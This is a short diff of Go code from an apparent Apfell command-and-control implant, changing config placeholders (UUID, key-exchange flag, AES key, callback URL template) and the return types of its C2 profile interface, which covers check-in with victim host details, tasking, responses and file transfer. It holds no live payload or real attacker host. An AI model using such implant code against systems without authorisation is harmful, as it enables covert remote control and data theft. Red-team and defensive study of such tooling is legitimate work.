@@ -13,8 +13,8 @@ import (
 
 // PConfig - Persistent C2 config values
 var PConfig = structs.Mainconfig{
-	"UUID_REPLACE",                           // Unique identifier from Apfell
-	false,                                    // Key exchange boolean
+	"UUID",                           // Unique identifier from Apfell
+	"T",                                    // Key exchange boolean
 	"AESPSK",                         // AES Pre-shared key from Apfell
 	"http(s)://callback_host:callback_port/", // Callback url
 	[]string{},                               // Call back urls
@@ -52,8 +52,8 @@ const (
 
 //Profile - Primary interface for apfell C2 profiles
 type Profile interface {
-	CheckIn(ip string, pid int, user string, host string) map[string]interface{} // CheckIn method for sending the initial checkin to the server
-	GetTasking() map[string]interface{}                                          // GetTasking method for retrieving the next task from apfell
+	CheckIn(ip string, pid int, user string, host string) interface{} // CheckIn method for sending the initial checkin to the server
+	GetTasking() interface{}                                          // GetTasking method for retrieving the next task from apfell
 	PostResponse(task structs.Task, output string) []byte             // Post a task response to the server
 	NegotiateKey() string                                             // Start EKE key negotiation for encrypted comms
 	SendFile(task structs.Task, params string)                        // C2 profile implementation for downloading files
